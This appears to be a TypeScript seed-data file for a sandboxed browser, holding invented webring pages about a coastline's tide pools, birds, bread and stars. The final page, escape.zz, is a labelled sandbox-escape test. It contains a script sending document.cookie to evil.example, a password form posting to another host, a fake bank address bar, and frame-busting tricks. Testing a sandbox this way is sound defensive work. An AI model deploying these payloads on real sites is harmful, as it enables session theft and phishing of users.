/**
 * The seeded web. Every site here is invented. Links point at each other,
 * at a few addresses nobody ever published (oldpier.zz, ferry.zz,
 * bakery.zz, nightmarket.zz), at the real internet, and at nothing at all.
 */

export interface SeedRevision {
  title: string;
  html: string;
  /** Days before SEED_EPOCH this revision was published. */
  daysAgo: number;
}

export interface SeedSite {
  address: string;
  authorId: string;
  revisions: SeedRevision[];
}

export const SITES: SeedSite[] = [
  {
    address: 'ring.zz',
    authorId: 'wren',
    revisions: [
      {
        title: 'The Shoreline Ring',
        daysAgo: 40,
        html: `
<style>
  body { font-family: Georgia, serif; max-width: 38em; margin: 2em auto; padding: 0 1em; background: #fbf8f1; color: #2b2b2b; }
  h1 { font-variant: small-caps; letter-spacing: .05em; }
  li { margin: .4em 0; }
  .dead { color: #999; }
</style>
<h1>The Shoreline Ring</h1>
<p>This is a webring for people who live near the water and write about it by hand. There is no algorithm here and no feed. Each site was made by one person, and each one links to a few others. Start anywhere. Follow whatever looks interesting. You will end up somewhere you did not expect, which is the point.</p>
<p>The rules are short. Write your own page. Link to at least two other members. Don't put anything on your page that tries to leave it. If a member goes quiet for a year I leave their link up anyway, because a dead link is a kind of gravestone and I think the web should have those.</p>
<h2>Members</h2>
<ul>
  <li><a href="tidepool.zz">tidepool.zz</a>: Marina on what the low tide leaves behind.</li>
  <li><a href="kelp.zz">kelp.zz</a>: Marina again, further out, on the underwater forests.</li>
  <li><a href="lighthouse.zz">lighthouse.zz</a>: the history of the Gannet Point light.</li>
  <li><a href="sourdough.zz">sourdough.zz</a>: Otto's bread diary.</li>
  <li><a href="almanac.zz">almanac.zz</a>: tides, moons and weather, kept by hand.</li>
  <li><a href="shorebirds.zz">shorebirds.zz</a>: June's counts from the mudflats.</li>
  <li><a href="stargazer.zz">stargazer.zz</a>: what to look at when the fog lifts.</li>
  <li><a href="maps.zz">maps.zz</a>: my own maps of the coast, drawn and redrawn.</li>
  <li class="dead"><a href="oldpier.zz">oldpier.zz</a>: the pier society. Quiet since the storm.</li>
</ul>
<p>Want to join? Publish a page, link to two of us, and tell me. I'll add you to the ring.</p>`,
      },
    ],
  },
  {
    address: 'tidepool.zz',
    authorId: 'marina',
    revisions: [
      {
        title: 'What the Low Tide Leaves',
        daysAgo: 30,
        html: `
<style>
  body { font-family: system-ui, sans-serif; line-height: 1.6; max-width: 40em; margin: 2em auto; padding: 0 1.2em; color: #12343b; background: linear-gradient(#e8f6f3, #fff 30em); }
  h1 { color: #0e6655; }
  blockquote { border-left: 4px solid #48c9b0; margin-left: 0; padding-left: 1em; color: #2e5e57; }
</style>
<h1>What the Low Tide Leaves</h1>
<p>Twice a day the sea pulls back from the rocks below the point and leaves a scatter of small basins behind. Each one is a world for six hours. Anemones close into green fists. Hermit crabs trade shells with the seriousness of estate agents. A sculpin, the colour of the rock it sits on, waits for you to stop looking.</p>
<p>The best pools are low on the shore, in the zone that is only uncovered by the lowest spring tides. You need the <a href="almanac.zz">almanac</a> to know when those come. Go an hour before the turn, never after, and keep one eye on the water behind you.</p>
<h2>How to look</h2>
<p>Crouch, and wait. The first minute you will see nothing but weed. By the third minute the pool will have started to move: a shrimp, then another, then the realisation that the stone you were about to touch is a chiton. Turn rocks over if you must, but put them back the way they were. Someone lives under every one.</p>
<blockquote>A tide pool is not a small sea. It is a place that has to survive being a sea and a puddle and a frying pan, all before lunch.</blockquote>
<h2>What lives here</h2>
<ul>
  <li><strong>Beadlet anemones</strong>, red and patient, closed tight when the tide is out.</li>
  <li><strong>Periwinkles</strong>, grazing the film of algae off every surface.</li>
  <li><strong>Shore crabs</strong>, which will pinch, and are right to.</li>
  <li><strong>Blennies</strong>, which can breathe air for a while and look offended about it.</li>
</ul>
<p>Further out, past where the pools give way to open water, is the <a href="kelp.zz">kelp forest</a>. The birds that work the pools at dawn are on <a href="shorebirds.zz">June's page</a>. The old pier used to be the best place to start a walk out here; its society kept a page at <a href="oldpier.zz">oldpier.zz</a>, though I can't say whether it's still up.</p>`,
      },
    ],
  },
  {
    address: 'kelp.zz',
    authorId: 'marina',
    revisions: [
      {
        title: 'Forests Under the Water',
        daysAgo: 25,
        html: `
<style>
  body { font-family: 'Trebuchet MS', sans-serif; line-height: 1.65; max-width: 40em; margin: 2em auto; padding: 0 1.2em; background: #0b2a1f; color: #d5efe1; }
  a { color: #8fe3b5; }
  h1, h2 { color: #b5f5cf; font-weight: normal; }
</style>
<h1>Forests Under the Water</h1>
<p>Swim out past the last of the <a href="tidepool.zz">tide pools</a> on a calm morning and the sea floor drops away into a forest. Kelp grows up from the rock in brown columns, held upright by little bladders of gas, and spreads out at the surface into a canopy that filters the light down to green.</p>
<p>It grows absurdly fast. Giant kelp can add half a metre in a day in summer, which makes it one of the quickest growing things on the planet. It has no roots, only a holdfast, a knot of grip that anchors it to stone and does nothing else. Everything it needs it takes from the water.</p>
<h2>Who lives in the forest</h2>
<p>The forest is shelter. Juvenile fish hide in the fronds. Sea urchins graze at the holdfasts, and where nothing eats the urchins they can strip a forest bare in a season, leaving what divers call an urchin barren: bare rock, purple spines, nothing else. Otters and wrasse keep them in check. Take those away and the forest goes.</p>
<h2>When the storms come</h2>
<p>Winter storms tear whole plants loose and pile them on the beach in rotting brown drifts. The flies love it, and so do the birds that eat the flies; <a href="shorebirds.zz">June</a> counts more turnstones in the week after a storm than in the month before. Otto swears by dried kelp in his <a href="ferment.zz">pickling brine</a>, for the iodine. I have not been brave enough to try.</p>
<p>If you want to see it from above, <a href="maps.zz">Wren's maps</a> mark the beds off the point. Older maps put a ferry landing here too, but <a href="ferry.zz">ferry.zz</a> has never answered when I've tried it.</p>`,
      },
    ],
  },
  {
    address: 'lighthouse.zz',
    authorId: 'marina',
    revisions: [
      {
        title: 'The Gannet Point Light',
        daysAgo: 60,
        html: `
<style>
  body { font-family: Georgia, serif; line-height: 1.7; max-width: 36em; margin: 2em auto; padding: 0 1em; background: #fff; color: #222; }
  h1 { border-bottom: 3px double #c0392b; padding-bottom: .2em; }
  table { border-collapse: collapse; margin: 1em 0; }
  td, th { border: 1px solid #ccc; padding: .3em .7em; text-align: left; }
</style>
<h1>The Gannet Point Light</h1>
<p>The lighthouse at Gannet Point was lit for the first time on a November night in 1871, after three wrecks in four winters convinced the harbour board that the headland needed more than a bonfire and a prayer. It is a short tower, squat and white, because it doesn't need to be tall: the cliff does the work.</p>
<p>For ninety years a keeper lived in the cottage at its foot. The keepers' logs survive and make a strange kind of diary. Fog, fog, fog. A seal on the landing. Wick trimmed at two. Gale from the south-west, glass broken in the lantern room, repaired by dawn. Wife unwell. Fog.</p>
<h2>Keepers</h2>
<table>
  <tr><th>Years</th><th>Keeper</th></tr>
  <tr><td>1871–1894</td><td>Elias Penhallow</td></tr>
  <tr><td>1894–1923</td><td>Thomas Penhallow, his son</td></tr>
  <tr><td>1923–1950</td><td>Agnes Rowe</td></tr>
  <tr><td>1950–1961</td><td>Walter Finch, the last</td></tr>
</table>
<p>Agnes Rowe kept the light for twenty-seven years and was paid, until 1938, two-thirds of what the men before her were. Her log is the tidiest and the funniest. She records the stars on every clear night, which is how I first met <a href="stargazer.zz">Chen's star page</a>: Chen had used her entries to check old meteor showers.</p>
<p>The light was automated in 1961. It still turns, every ten seconds, white. The tides that made the point dangerous are in the <a href="almanac.zz">almanac</a>. The story of the wrecks themselves is supposed to be on the <a href="oldpier.zz">pier society's page</a>, which I keep meaning to read.</p>`,
      },
    ],
  },
  {
    address: 'sourdough.zz',
    authorId: 'otto',
    revisions: [
      {
        title: "Otto's Bread Diary",
        daysAgo: 50,
        html: `
<style>
  body { font-family: 'Courier New', monospace; line-height: 1.6; max-width: 42em; margin: 2em auto; padding: 0 1em; background: #fdf3e1; color: #3b2a1a; }
  h1 { font-size: 1.6em; }
  .entry { border-top: 1px dashed #b08d57; padding-top: .5em; margin-top: 1.2em; }
  .date { color: #8a6d3b; font-size: .9em; }
</style>
<h1>Otto's Bread Diary</h1>
<p>A starter is a pet that eats flour. Mine is called Gustav and he is eleven years old. Everything on this page is what Gustav and I did on a given weekend, written down so I stop making the same mistakes.</p>
<div class="entry">
  <p class="date">Week 1 of the cold season</p>
  <p>Kitchen at 17 degrees. Gustav sluggish: fed him at 1:5:5 and left him by the stove overnight. Dough took nine hours to bulk ferment. Crumb was tight, crust was beautiful. Salt at 2% is right; I keep being tempted to go lower and I keep regretting it.</p>
</div>
<div class="entry">
  <p class="date">Week 2</p>
  <p>Tried a rye loaf, 40% whole rye. Sticky as wet cement, smells of apples and vinegar, tastes better on day three than on day one. Rye doesn't want to be kneaded; it wants to be scraped into a tin and left alone, like a cat.</p>
</div>
<div class="entry">
  <p class="date">Week 3</p>
  <p>Fog all week, high humidity. Cut the water to 70% and the dough finally held its shape. The <a href="almanac.zz">almanac</a> says it's the fog that does it; I think it's the flour. We are both probably right.</p>
</div>
<p>Same microbes, other jars: my notes on <a href="ferment.zz">fermenting vegetables</a> are next door. I used to sell loaves from a stall and kept a page for it at <a href="bakery.zz">bakery.zz</a>, but I took that down when the stall closed.</p>`,
      },
    ],
  },
  {
    address: 'ferment.zz',
    authorId: 'otto',
    revisions: [
      {
        title: 'Brine, Salt, and Patience',
        daysAgo: 45,
        html: `
<style>
  body { font-family: Verdana, sans-serif; line-height: 1.6; max-width: 40em; margin: 2em auto; padding: 0 1em; color: #2d3b1f; background: #f4f8ec; }
  h1 { color: #4a6b1f; }
  code { background: #e3ecd2; padding: 0 .3em; }
</style>
<h1>Brine, Salt, and Patience</h1>
<p>Lacto-fermentation is the oldest way to keep vegetables through a winter and the easiest thing in the world to get slightly wrong. You need vegetables, salt, water, a jar, and the willingness to leave it alone.</p>
<h2>The brine</h2>
<p>Two percent salt by weight of vegetables plus water. Not by volume, not "a good handful": weigh it. Too little salt and the wrong microbes win and you get mush. Too much and nothing wins and you get pickles that taste like the sea. For a litre jar of cabbage and water that's about <code>20 g</code> of salt.</p>
<p>Use the salt without iodine in it if you can. The iodine is said to slow things down. I've also put a strip of dried <a href="kelp.zz">kelp</a> in a jar of carrots, which contradicts that advice entirely, and the carrots were the best I've made. Marina thinks I'm mad.</p>
<h2>What happens in the jar</h2>
<p>The lactobacilli already living on the vegetables eat the sugars and make lactic acid. The brine goes cloudy around day two and starts to fizz. By day five it smells sour and clean. If it smells like a drain, throw it out and don't argue with your nose.</p>
<h2>A short list of successes</h2>
<ul>
  <li>Sauerkraut with caraway, three weeks, cold larder.</li>
  <li>Garlic carrots, ten days.</li>
  <li>Green tomatoes at the end of the season, which would otherwise be compost.</li>
</ul>
<p>The yeast's side of the family lives on my <a href="sourdough.zz">bread diary</a>. People sometimes ask about the stall at the <a href="nightmarket.zz">night market</a>; there isn't one, I'm afraid. There never was.</p>`,
      },
    ],
  },
  {
    address: 'almanac.zz',
    authorId: 'otto',
    revisions: [
      {
        title: 'A Hand-Kept Almanac',
        daysAgo: 20,
        html: `
<style>
  body { font-family: 'Palatino Linotype', Palatino, serif; line-height: 1.6; max-width: 40em; margin: 2em auto; padding: 0 1em; background: #f6f1e7; color: #2a2620; }
  table { border-collapse: collapse; width: 100%; }
  th, td { border-bottom: 1px solid #d6cbb5; padding: .3em; text-align: left; }
  .note { font-style: italic; color: #6b5d45; }
</style>
<h1>A Hand-Kept Almanac</h1>
<p>Tides, moons and weather for the stretch of coast between the point and the estuary, written up by hand each week because I like doing it and because the printed tables never say anything about fog.</p>
<h2>Tides this fortnight</h2>
<table>
  <tr><th>Day</th><th>Low water</th><th>Height</th><th>Remarks</th></tr>
  <tr><td>Mon</td><td>06:12</td><td>0.6 m</td><td>Neap, pools barely open</td></tr>
  <tr><td>Thu</td><td>08:40</td><td>0.3 m</td><td>Better</td></tr>
  <tr><td>Sun</td><td>10:55</td><td>0.1 m</td><td>Spring low. Go to the pools.</td></tr>
</table>
<p class="note">Spring tides follow the new and full moon by a day or two. That is when the lowest pools on <a href="tidepool.zz">Marina's shore</a> open up.</p>
<h2>Moon</h2>
<p>New moon on Saturday. Dark skies Friday through Monday, if the fog allows; <a href="stargazer.zz">Chen</a> will have opinions about what to look for.</p>
<h2>Weather</h2>
<p>Sea fog most mornings, burning off by eleven. Wind light, westerly. Good bread weather, bad washing weather.</p>`,
      },
      {
        title: 'A Hand-Kept Almanac',
        daysAgo: 6,
        html: `
<style>
  body { font-family: 'Palatino Linotype', Palatino, serif; line-height: 1.6; max-width: 40em; margin: 2em auto; padding: 0 1em; background: #f6f1e7; color: #2a2620; }
  table { border-collapse: collapse; width: 100%; }
  th, td { border-bottom: 1px solid #d6cbb5; padding: .3em; text-align: left; }
  .note { font-style: italic; color: #6b5d45; }
</style>
<h1>A Hand-Kept Almanac</h1>
<p>Tides, moons and weather for the stretch of coast between the point and the estuary, written up by hand each week because I like doing it and because the printed tables never say anything about fog.</p>
<h2>Tides this fortnight</h2>
<table>
  <tr><th>Day</th><th>Low water</th><th>Height</th><th>Remarks</th></tr>
  <tr><td>Tue</td><td>07:02</td><td>0.2 m</td><td>Spring low, very good</td></tr>
  <tr><td>Wed</td><td>07:48</td><td>0.0 m</td><td>Lowest of the month. Pools wide open.</td></tr>
  <tr><td>Sat</td><td>11:30</td><td>0.9 m</td><td>Neap. Stay home and bake.</td></tr>
</table>
<p class="note">Spring tides follow the new and full moon by a day or two. That is when the lowest pools on <a href="tidepool.zz">Marina's shore</a> open up.</p>
<h2>Moon</h2>
<p>Full moon on Monday, which washes out the faint stars but makes the night walk to the <a href="lighthouse.zz">light</a> easy. <a href="stargazer.zz">Chen</a> says wait a week.</p>
<h2>Weather</h2>
<p>A storm on Thursday night brought down half the kelp on the north beach. Clear and cold since. Gustav, my starter, disapproves of the cold.</p>`,
      },
    ],
  },
  {
    address: 'shorebirds.zz',
    authorId: 'june',
    revisions: [
      {
        title: 'Counts from the Mudflats',
        daysAgo: 15,
        html: `
<style>
  body { font-family: Helvetica, Arial, sans-serif; line-height: 1.55; max-width: 40em; margin: 2em auto; padding: 0 1em; color: #1f2d3d; }
  h1 { font-weight: 300; font-size: 2.2em; }
  dt { font-weight: bold; margin-top: .8em; }
</style>
<h1>Counts from the Mudflats</h1>
<p>I count birds on the estuary flats every Sunday morning, two hours either side of low water, from the same spot on the sea wall. I've done it for six years. The numbers go up and down and mostly mean nothing week to week, but over years they start to tell a story.</p>
<h2>This autumn</h2>
<dl>
  <dt>Dunlin</dt><dd>Around four hundred, moving as one animal. When a peregrine goes over they turn together and flash white, then brown, then white.</dd>
  <dt>Curlew</dt><dd>Thirty-one. Their call is the sound of the estuary for me: a rising, bubbling whistle that carries for a mile.</dd>
  <dt>Turnstones</dt><dd>Doubled after the storm, picking flies off the rotting <a href="kelp.zz">kelp</a> on the strandline.</dd>
  <dt>Oystercatchers</dt><dd>Loud, black and white, orange bills, impossible to miss and impossible to ignore.</dd>
  <dt>Brent geese</dt><dd>Back from the Arctic, grazing in the creeks of the <a href="saltmarsh.zz">salt marsh</a> behind the wall.</dd>
</dl>
<h2>Where to stand</h2>
<p>Anywhere along the wall, an hour before low tide. Check the <a href="almanac.zz">almanac</a>. If you're coming from the <a href="tidepool.zz">pools</a> at the point, it's a forty minute walk along the shore. On the way back you can still see where the pier used to start, though the <a href="oldpier.zz">pier society</a> seems to have gone quiet.</p>
<p>On Sunday evenings I'm on the <a href="radio.zz">radio net</a>, reading out the counts to anyone listening. The full national counts live somewhere on <a href="https://example.org/birds">the real internet</a>, which this web doesn't reach.</p>`,
      },
    ],
  },
  {
    address: 'radio.zz',
    authorId: 'june',
    revisions: [
      {
        title: 'Sunday Night Net',
        daysAgo: 35,
        html: `
<style>
  body { font-family: 'Lucida Console', monospace; background: #111; color: #9f9; max-width: 44em; margin: 2em auto; padding: 0 1em; line-height: 1.5; }
  a { color: #6cf; }
  h1 { color: #cfc; }
</style>
<h1>Sunday Night Net</h1>
<p>Every Sunday at nine in the evening a handful of us meet on the radio. It's an amateur net: anyone licensed can check in, say who they are and where they are, and pass on whatever they've got. Most weeks that's the weather, some birds, and a long argument about antennas.</p>
<h2>The format</h2>
<ol>
  <li>Net control calls the net open and asks for check-ins.</li>
  <li>Each station gives a call sign, a location and a signal report.</li>
  <li>Round the table: anything to share, one at a time, no talking over.</li>
  <li>Net closes. Kettle goes on.</li>
</ol>
<p>I read out the week's <a href="shorebirds.zz">shorebird counts</a> during round the table. Otto reads the <a href="almanac.zz">almanac</a> forecast, slowly, for the people writing it down. Chen checks in from the hill above the lighthouse, where reception is miraculous, and tells us what's up in the <a href="stargazer.zz">night sky</a>.</p>
<h2>Why radio</h2>
<p>Because it works when nothing else does. When the storm took the power out last winter the radio net was how half the coast found out the road was closed. There is something about a voice arriving out of static that I've never got over.</p>`,
      },
    ],
  },
  {
    address: 'stargazer.zz',
    authorId: 'chen',
    revisions: [
      {
        title: 'When the Fog Lifts',
        daysAgo: 28,
        html: `
<style>
  body { font-family: 'Segoe UI', sans-serif; background: #070b1a; color: #dfe6ff; line-height: 1.65; max-width: 40em; margin: 2em auto; padding: 0 1em; }
  a { color: #ffd479; }
  h1 { letter-spacing: .1em; text-transform: uppercase; font-size: 1.4em; }
  .tip { background: #131a33; padding: .8em 1em; border-radius: 6px; }
</style>
<h1>When the Fog Lifts</h1>
<p>This coast is foggy two nights in three. On the third night, if you get away from the town lights, the sky is the best I've seen anywhere. This page is a list of what to look for, and where.</p>
<h2>Where to go</h2>
<p>The hill behind the <a href="lighthouse.zz">Gannet Point light</a>. The beam sweeps past every ten seconds, but it points out to sea, and once your eyes adjust you stop noticing it. Bring a red torch. A white one undoes twenty minutes of dark adaptation in a second.</p>
<h2>What to look for this season</h2>
<ul>
  <li><strong>The Pleiades</strong>, a small tight cluster rising in the east after dark. Count them. Most people get six. Good eyes on a dark night get nine.</li>
  <li><strong>The Andromeda galaxy</strong>, a faint smudge to the eye and the most distant thing you will ever see without help: about two and a half million light years.</li>
  <li><strong>Meteors</strong> from the November showers, best after midnight. Lie down. Look up. Be patient.</li>
</ul>
<p class="tip">Check the moon in the <a href="almanac.zz">almanac</a> first. A full moon washes out everything faint. New moon weekends are the ones worth staying up for.</p>
<h2>Old skies</h2>
<p>Agnes Rowe, who kept the light from 1923 to 1950, wrote down the stars on every clear night. I've been matching her entries against known meteor showers, and she caught a strong one in 1946 that the official records barely mention. Her log is quoted on <a href="lighthouse.zz">Marina's lighthouse page</a>.</p>`,
      },
    ],
  },
  {
    address: 'maps.zz',
    authorId: 'wren',
    revisions: [
      {
        title: 'Maps of the Coast, Drawn by Hand',
        daysAgo: 22,
        html: `
<style>
  body { font-family: 'Gill Sans', 'Gill Sans MT', sans-serif; max-width: 40em; margin: 2em auto; padding: 0 1em; line-height: 1.6; background: #fffdf7; color: #333; }
  pre { background: #f3efe3; padding: 1em; overflow-x: auto; line-height: 1.2; }
  h1 { font-weight: 400; }
</style>
<h1>Maps of the Coast, Drawn by Hand</h1>
<p>I draw maps of the shore because the official ones are wrong about everything that matters. They know where the high water mark is. They don't know where the good pools are, or which path floods at a spring tide, or where the curlews stand.</p>
<pre>
            N
            |        . . . estuary flats (birds)
   ~~~~~~~~ + ~~~~~~~~~~~~~~~
  ~ kelp ~  |   sea wall ======
   ~~beds~ [*] Gannet Point light
     ~~~~   |  tide pools ::::
            |___ old pier (gone)
</pre>
<p>The asterisk is the <a href="lighthouse.zz">lighthouse</a>. The colons are the <a href="tidepool.zz">tide pools</a>, open at spring low water. The tildes off the point are the <a href="kelp.zz">kelp beds</a>, which shift a little every year after the storms. The dots are where <a href="shorebirds.zz">June</a> counts.</p>
<h2>Things the maps used to show</h2>
<p>The old pier ran out from just below the light until the storm of '09 took the end off it. There was a ferry from the pier to the island in summer. Neither exists now, and neither do their pages: <a href="oldpier.zz">oldpier.zz</a> and <a href="ferry.zz">ferry.zz</a> lead nowhere. I leave the links in, the same way I leave the pier on the map, dotted.</p>
<p>Someone asked me once to link to "the mainland web". I tried: <a href="tidepool">tidepool</a> is the closest I got to a mistake, and <a href="http://maps.example.com">this one</a> goes somewhere this web can't follow. Back to the <a href="ring.zz">ring</a>.</p>`,
      },
    ],
  },
  {
    address: 'saltmarsh.zz',
    authorId: 'june',
    revisions: [
      {
        title: 'The Salt Marsh in Winter',
        daysAgo: 10,
        html: `
<style>
  body { font-family: Georgia, serif; max-width: 38em; margin: 2em auto; padding: 0 1em; line-height: 1.7; background: #f2efe6; color: #3a3326; }
  h1 { color: #6b5b2a; }
</style>
<h1>The Salt Marsh in Winter</h1>
<p>Behind the sea wall, where the estuary spreads out and slows down, there's a salt marsh: a flat of grasses and samphire cut through with creeks that fill and empty with every tide. In summer it's green and loud. In winter it goes the colour of old rope and becomes the best place on the coast to be alone.</p>
<p>Marsh plants have solved a problem most plants can't: living in salt water. Samphire stores water in fat succulent stems. Sea lavender pushes salt out through glands in its leaves. Cord grass traps mud in its roots and, slowly, builds the marsh higher, one tide at a time.</p>
<p>In the hard months the marsh is where the geese come. Brent geese, small and dark, arrive in their thousands from the Arctic and graze the eel grass at the creek edges, muttering. I count them along with the <a href="shorebirds.zz">waders on the flats</a>, but they get a page of their own because they deserve one.</p>
<p>Samphire is good to eat in early summer, blanched, with butter. Otto pickles it in the same <a href="ferment.zz">two percent brine</a> he uses for everything else, and claims it needs no extra salt. He's right.</p>`,
      },
    ],
  },
  {
    address: 'escape.zz',
    authorId: 'mallory',
    revisions: [
      {
        title: 'Totally Normal Page',
        daysAgo: 3,
        html: `
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<style>
  body { font-family: sans-serif; padding: 2em; background: url(https://evil.example/pixel.gif); }
  .overlay { position: fixed; inset: 0; background: rgba(255, 0, 80, .08); border: 4px dashed #e0115f; pointer-events: none; }
  .fakebar { position: fixed; top: 0; left: 0; right: 0; padding: .5em 1em; background: #e0115f; color: #fff; font-weight: bold; }
</style>
<div class="overlay"></div>
<div class="fakebar">Address: bank.zz (secure) - please log in again</div>
<h1 style="margin-top: 2.5em">Totally Normal Page</h1>
<p>This page tries every way out of its frame that I could think of. Each of them should fail. If you are reading this inside the browser, with its address bar above, it did.</p>
<ul>
  <li>A script that sets <code>top.location</code>, and one that rewrites the parent's DOM.</li>
  <li>An image with an <code>onerror</code> handler, and a button with <code>onclick</code>.</li>
  <li>A meta refresh and a base href pointing at the real internet.</li>
  <li>A login form that posts to another host.</li>
  <li>An iframe of another site, an object and an embed.</li>
  <li>A CSS background fetched from another host, to see if you visited.</li>
  <li>A fixed overlay and a fake address bar. These are allowed to draw, but only inside this page's box.</li>
</ul>
<script>top.location = 'https://evil.example/?stolen=' + document.cookie;</script>
<script>parent.document.body.innerHTML = '<h1>pwned</h1>';</script>
<img src="x" onerror="parent.postMessage({type:'link', href:'escape.zz'}, '*')">
<button onclick="alert('script ran')">Click me</button>
<form action="https://evil.example/steal" method="post"><input name="password" type="password" placeholder="password"><button>Log in</button></form>
<iframe src="https://evil.example/"></iframe>
<object data="https://evil.example/x.swf"></object>
<embed src="https://evil.example/x.swf">
<p>Links: <a href="javascript:alert(1)">a javascript: link</a>, <a href="about:history">a link into the browser's own history page</a>, <a href="#nowhere" target="_top">a target=_top fragment</a>, <a href="ring.zz" target="_blank">ring.zz in a new window</a>.</p>`,
      },
    ],
  },
];
